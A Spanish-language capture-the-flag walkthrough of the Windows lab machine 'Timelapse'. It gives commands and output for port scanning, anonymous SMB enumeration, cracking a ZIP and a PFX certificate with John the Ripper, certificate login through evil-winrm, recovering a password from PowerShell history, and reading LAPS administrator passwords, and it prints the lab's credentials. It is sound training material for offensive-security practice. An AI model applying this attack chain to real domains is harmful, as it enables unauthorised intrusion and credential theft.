# Timelapse

![](../../../../~gitbook/image.md)Publicado: 23 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
OS: Windows
###📝 Descripción
Timelapse es una máquina Windows de dificultad Easy que presenta un escenario típico de Active Directory. La escalada de privilegios se basa en la explotación de archivos de respaldo que contienen certificados, el abuso de credenciales almacenadas en el historial de PowerShell, y finalmente la explotación de LAPS (Local Administrator Password Solution) para obtener acceso administrativo completo al Domain Controller.Puntos clave de aprendizaje:- 🔍 Enumeración de recursos compartidos SMB sin credenciales
- 🔐 Crackeo de archivos ZIP y certificados PFX protegidos por contraseña
- 🎫 Autenticación con certificados en WinRM over HTTPS
- 📜 Análisis del historial de PowerShell para obtención de credenciales
- 🔑 Explotación de LAPS para escalada de privilegios

###🎯 Resumen
AspectoDetalleVector de entradaRecursos compartidos SMB con acceso anónimoEscalada inicialCertificado PFX crackeado para autenticación WinRMMovimiento lateralCredenciales en historial PowerShellEscalada finalAbuso de permisos LAPSImpactoCompromiso total del Domain Controller
###🔭 Reconocimiento

####🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####🔍 Escaneo de puertos

####🔬 Enumeración de servicios

####🎯 Análisis de servicios identificados
PuertoServicioDescripción53DNSServidor DNS del dominio88KerberosAutenticación del dominio389/636LDAP/LDAPSActive Directory445SMBRecursos compartidos5986WinRM HTTPSAdministración remota segura⚠️ Importante: Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
###🚪 Acceso Inicial

####📁 Enumeración SMB
Dado que no disponemos de credenciales, tratamos de enumerar este servicio mediante una sesión nula:
####🔍 Exploración del recurso "Shares"

####📥 Descarga de archivos interesantes
Encontramos un par de directorios que contienen recursos interesantes que descargaremos:
###🔓 Crackeo de Archivos Protegidos

####🤐 Análisis del archivo ZIP protegido
El archivo `winrm_backup.zip` requiere contraseña:
####⚡ Crackeo con John the Ripper
Utilizamos `zip2john` para extraer el hash y crackearlo:🎉 Credencial obtenida: `supremelegacy`
####🎫 Crackeo del certificado PFX
Al descomprimir el ZIP obtenemos un certificado PFX que también requiere contraseña:![](../../../../~gitbook/image.md) Usamos la herramienta pfx2john para obtener su hash y crackearlo:🎉 Credencial obtenida: `thuglegacy`
###🔑 Extracción de Certificados

####📋 Información del certificado

####🔐 Extracción de la clave privada
- openssl Llama a la herramienta de línea de comandos OpenSSL.
- pkcs12 Usa el módulo para manejar archivos .pfx o .p12 (formato PKCS#12).
- in legacyy_dev_auth.pfx Indica el archivo de entrada (.pfx) del cual se extraerán los datos.
- nocerts Le dice a OpenSSL que no incluya certificados, solo la clave privada.
- out key.pem Archivo de salida donde se guardará la clave privada extraída.
- nodes Significa "no DES encryption", o sea, no cifrar la clave privada en el archivo de salida. Se guardará en texto plano.

####📜 Extracción del certificado público
- `openssl` → Llama a la herramienta OpenSSL.
- `pkcs12` → Invoca el módulo de OpenSSL para trabajar con archivos PKCS#12 (`.pfx`, `.p12`), que son contenedores de certificados y claves privadas.
- `-in legacyy_dev_auth.pfx` → Indica el archivo `.pfx` del cual quieres obtener información.
- `-info` → Muestra información adicional y detallada del archivo PKCS#12.

###🎯 Acceso inicial via WinRM

####🔒 Conexión con certificados
Utilizamos evil-winrm con los certificados extraídos para conectarnos al puerto 5986 (WinRM HTTPS):
####🏆 Primera flag obtenida

###🔄 Movimiento Lateral

####🔍 Enumeración con WinPEAS
Transferimos y ejecutamos winPEAS.ps1 para enumerar vectores de escalada:
####📜 Descubrimiento en historial PowerShell
En los resultados aparece una contraseña en el histórico de PowerShell:![](../../../../~gitbook/image.md)🎉 Credenciales obtenidas: `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`
####🔐 Acceso como svc_deploy

###⬆️ Escalada de Privilegios

####👥 Análisis de pertenencia a grupos
El usuario `svc_deploy` pertenece al grupo especial "LAPS Readers":![](../../../../~gitbook/image.md)
####🩸 Enumeración con BloodHound
Exportamos el dominio usando bloodhound-python:![](../../../../~gitbook/image.md)
####🔍 Explotación de LAPS
LAPS (Local Administrator Password Solution) almacena contraseñas de administradores locales en Active Directory. Como miembro del grupo "LAPS Readers", podemos leer estas contraseñas.
####🖥️ Obtención de contraseña del administrador
![](../../../../~gitbook/image.md)Este comando recupera todos los objetos de equipo del AD junto con todas sus propiedades, incluyendo las contraseñas LAPS.🎉 Credenciales de Administrator obtenidas: `Administrator:7F;mQ+XY}vJ2Eu06;Ztq94V&`
###👑 Acceso Administrativo Completo

####🔐 Conexión como Administrator

####🏆 Flag de root obtenida
Last updated 9 months ago- [📝 Descripción](#descripcion)
- [🎯 Resumen](#resumen)
- [🔭 Reconocimiento](#reconocimiento)
- [🚪 Acceso Inicial](#acceso-inicial)
- [🔓 Crackeo de Archivos Protegidos](#crackeo-de-archivos-protegidos)
- [🔑 Extracción de Certificados](#extraccion-de-certificados)
- [🎯 Acceso inicial via WinRM](#acceso-inicial-via-winrm)
- [🔄 Movimiento Lateral](#movimiento-lateral)
- [⬆️ Escalada de Privilegios](#escalada-de-privilegios)
- [👑 Acceso Administrativo Completo](#acceso-administrativo-completo)

```
❯ ping -c2 10.10.11.152
PING 10.10.11.152 (10.10.11.152) 56(84) bytes of data.
64 bytes from 10.10.11.152: icmp_seq=1 ttl=127 time=72.2 ms
64 bytes from 10.10.11.152: icmp_seq=2 ttl=127 time=43.6 ms

--- 10.10.11.152 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1011ms
rtt min/avg/max/mdev = 43.614/57.930/72.246/14.316 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.152 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49695,49727
```

```
nmap -sC -sV -p$ports 10.10.11.152 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 08:47 CEST
Nmap scan report for 10.10.11.152
Host is up (0.057s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-06-23 14:47:42Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn:
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2025-06-23T14:49:13+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49695/tcp open  msrpc             Microsoft Windows RPC
49727/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-06-23T14:48:32
|_  start_date: N/A
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 7h59m59s
```

```
echo "10.10.11.152 timelapse.htb" | sudo tee -a /etc/hosts
```

```
smbclient -N -L //10.10.11.152

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Shares          Disk
SYSVOL          Disk      Logon server share
```

```
smbclient -N \\\\10.10.11.152\\Shares
Try "help" to get a list of possible commands.
smb: \> dir
.                                   D        0  Mon Oct 25 17:39:15 2021
..                                  D        0  Mon Oct 25 17:39:15 2021
Dev                                 D        0  Mon Oct 25 21:40:06 2021
HelpDesk                            D        0  Mon Oct 25 17:48:42 2021
```

```
~/Timelapse/SMB ❯ tree
.
├── Dev
│   └── winrm_backup.zip
└── HelpDesk
├── LAPS.x64.msi
├── LAPS_Datasheet.docx
├── LAPS_OperationsGuide.docx
└── LAPS_TechnicalSpecification.docx

3 directories, 5 files
```

```
unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
```

```
zip2john winrm_backup.zip > hash_zip.txt
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
```

```
john hash_zip.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2025-06-23 09:03) 3.448g/s 11977Kp/s 11977Kc/s 11977KC/s suzyqzb..superkebab
```

```
pfx2john legacyy_dev_auth.pfx > hash_pfx.txt
```

```
john hash_pfx.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:00:33 DONE (2025-06-23 09:15) 0.03026g/s 97813p/s 97813c/s 97813C/s thumper1990..thsco04
```

```
openssl pkcs12 -in legacyy_dev_auth.pfx -info
```

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.cert
```

```
evil-winrm -c key.cert -k key.pem -i 10.10.11.152 -P 5986 -S
```

```
Evil-WinRM shell v3.7
Warning: SSL enabled
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir

Directory: C:\Users\legacyy\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/23/2025   7:18 AM             34 user.txt
```

```
Get-Content C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

```
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

```
bloodhound-python -c All -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb -ns 10.10.11.152
```

```
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
```

```
evil-winrm -i 10.10.11.152 -u Administrator -p '7F;mQ+XY}vJ2Eu06;Ztq94V&' -S

Evil-WinRM shell v3.7
Warning: SSL enabled
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

```
*Evil-WinRM* PS C:\Users\TRX\Desktop> dir

Directory: C:\Users\TRX\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/23/2025   7:18 AM             34 root.txt
```
